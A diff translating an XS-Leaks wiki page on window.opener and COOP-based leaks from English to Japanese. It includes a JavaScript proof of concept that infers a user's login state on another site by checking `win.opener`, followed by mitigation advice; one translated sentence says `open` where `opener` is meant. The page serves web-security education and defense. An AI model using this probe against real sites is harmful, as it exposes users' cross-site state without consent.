@@ -17,33 +17,33 @@ menu = "main"
 weight = 2
 +++
 
+もしページが `opener` プロパティを `null` に設定したり、ユーザーの状態に応じて [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) による保護を使っているなら、その状態に関するクロスサイト情報を推測できる。
+例えば、攻撃者は認証されたユーザーのみがアクセスできる iframe (または新しいウィンドウ) でエンドポイントを開き、そのウィンドウの参照をチェックするだけで、ユーザーがログインしているかどうかを検出することができる。
 
-If a page sets its `opener` property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. 
-
-## Code Snippet
-The below snippet demonstrates how to detect whether the `opener` property was set to `null`, or whether the [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) header is present with a value other than `unsafe-none`. This can be done with both iframes and new windows.
+## コード
+以下のコードを用いることで、`open` プロパティが `null` に設定されているか、あるいは [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) ヘッダーが `unsafe-none` 以外の値で存在するかどうかを検出できる。
+これは、iframeと新しいウィンドウの両方で行うことができる。
 
 ```javascript
-// define the vulnerable URL
+// 脆弱な攻撃対象URL
 const v_url = 'https://example.org/profile';
 
 const exploit = (url, new_window) => {
   let win;
   if(new_window){
-    // open the url in a new tab to see if win.opener was affected by COOP
-    // or set to null
+    // 新しいタブを開き、win.opener が COOP の影響を受けたか、あるいは null に設定されたかどうかを確認
     win = open(url);
   }else{
-    // create an iframe to detect whether the opener is defined
-    // won't work for COOP detection, or if a page has implemented framing protections
+    // opener が定義されているかどうかを検出するために iframe を作成
+    // COOP の検出や、ページがフレーム保護を実装している場合は機能しない
     document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
-    // redirect the iframe to the vulnerable URL
+    // iframeを脆弱な攻撃対象URLにリダイレクトする
     win = open(url, "xsleaks");
   }
   
-  // wait 2 seconds to let the page load
+  // ページのロードを2秒待つ
   setTimeout(() => {
-    // check the opener property of the newly opened window
+    // 新しく開いたウィンドウのオープナープロパティを確認する
     if(!win.opener) console.log("win.opener is null");
     else console.log("win.opener is defined");
   }, 2000);
@@ -53,6 +53,7 @@ exploit(v_url, 1);
 
 ```
 
-## Defense
+## 対策
 
-To mitigate this type of XS-Leak, be consistent across different pages: set the `opener` property to the same value on all pages using COOP. Using JavaScript to set `opener` to `null` can result in edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
+この種の XS-Leak を軽減する方法は、COOP を使ってすべてのページで `opener` プロパティを同じ値に設定し、異なるページ間で一貫性を持たせることである。
+JavaScript を使って `opener` を `null` に設定すると、iframe のサンドボックス属性を使って JavaScript を完全に無効にすることができるため、エッジケースが発生することがある。
